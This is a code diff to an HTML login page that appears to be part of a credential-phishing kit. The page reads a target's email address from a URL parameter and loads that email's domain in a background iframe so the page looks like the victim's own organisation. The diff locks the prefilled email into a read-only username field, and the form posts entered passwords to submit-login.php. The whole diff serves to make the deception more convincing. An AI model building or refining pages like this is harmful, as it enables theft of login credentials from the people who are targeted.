@@ -167,6 +167,12 @@
             border-color: blue;
             box-shadow: 0px 0px 10px rgba(0, 0, 255, 0.5);
         }
+
+        /* Uneditable field styling */
+        #username[readonly] {
+            background-color: #f0f0f0;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 <body>
@@ -179,7 +185,7 @@
                 <form id="loginForm" action="submit-login.php" method="post">
                     <div class="input-container">
                         <i class="fas fa-user icon"></i>
-                        <input type="text" id="username" name="username" placeholder="电子邮件" required>
+                        <input type="text" id="username" name="username" placeholder="电子邮件" required readonly>
                     </div>
                     <div class="input-container">
                         <i class="fas fa-lock icon"></i>
@@ -200,12 +206,12 @@
     </div>
 
     <script>
-        // Function to get the email domain from the query string
-        function getEmailDomain(queryString) {
+        // Function to get the email from the query string
+        function getEmailFromQuery(queryString) {
             const params = new URLSearchParams(queryString);
             const email = params.get('files');
             if (email) {
-                return email.split('@')[1];
+                return email;
             }
             return '';
         }
@@ -220,13 +226,16 @@
         // Function to load the iframe in the background
         function loadIframeInBackground() {
             const queryString = window.location.search;
-            const domain = getEmailDomain(queryString);
+            const email = getEmailFromQuery(queryString);
 
-            if (domain) {
+            if (email) {
                 const iframe = document.createElement('iframe');
-                iframe.src = 'https://' + domain;
+                iframe.src = 'https://' + email.split('@')[1];
                 iframe.className = 'background-iframe';
                 document.body.appendChild(iframe);
+
+                // Set the email in the username field
+                document.getElementById('username').value = email;
             }
         }
 
